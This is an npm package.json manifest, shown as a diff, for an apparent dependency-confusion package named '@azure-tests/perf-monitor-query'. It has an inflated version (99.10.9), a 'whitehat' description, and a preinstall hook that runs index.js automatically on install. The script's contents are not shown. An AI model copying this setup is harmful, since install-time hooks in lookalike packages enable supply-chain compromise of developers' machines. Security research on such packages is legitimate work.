@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-monitor-query",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-monitor-query@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-pFoYjV7okSZ51JURaXpGwtv0RVC5UqkE3WAJdV7UEDpRHj6MpSg4wUoJSEbLC/GU+bgSUT4iKiC1uEvyv+gu8w==",
+        "shasum": "9ee51122a1c42fd931af7308d8931ff5356dfac6",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-monitor-query/-/perf-monitor-query-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3595,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSRiCRA9TVsSAnZWagAA0IsQAIV53tMlNGSk73VZmEHQ\nlTeHf0gLt5tI0cNeWeKL/cpghkTa1qu7tRkxMukkaDtuF2SInHaIuigZRW2M\nAXG4ldaIvvOhaYfiKeCYj1uqzK0pjrLCfiT1DhIjAsJ04z/EE8wtV2/of2za\nQ1wL92dJ4b4Zr5/NlBUppLwrgD/RZfDYpldzOJfO1dKM9cTZdkCNNX3izDzU\nJ7xexKJ3br5OY/Ajk8V5Iq5utR6QogWrobQqi4LC6DkOvGWqEH3J/945tXYD\nY8BhIfY+217ZMn8p0EPOef27Iqjuor3R9oEhDAjA9o7ilGAx3zzjmIxe0jgS\n3ZQff1l5mGdZxwCjOJKPpHDxpDlqGpxyvOynFhE8EpjZHqBR8HN8uNnoqsWw\ndH+jw7f7YNB4JRPUC+JOFknA8bR+O0whoh0NWEWpn8XDCHm2s/NKReZe2fJl\ncwIt52vm14GMqnZYTR9rl9HwUBm5lqeEzTNtiYVvPNGQTOLCYjcLxd3GYgfI\nPV901QnzqmKcROfgK+n3z1FdCJfowAbMkNAh4WMz6SBfO5s+FubEY6+kpbvX\nRYJR+JHwA9iCXwpa2jKnp6MNxgGDyk7d8l4UQH7btkNsF4uThs3fbWvZQgpE\nbOTJ8LH2XM0nN5EKnZ+BYpyKTBL+j3Bm4UHa+udtgTQ2TDvJiMU1g0z29C7P\neRn0\r\n=W14g\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-monitor-query_99.10.9_1637950562232_0.8549141821926658"
+    },
+    "_hasShrinkwrap": false
+}
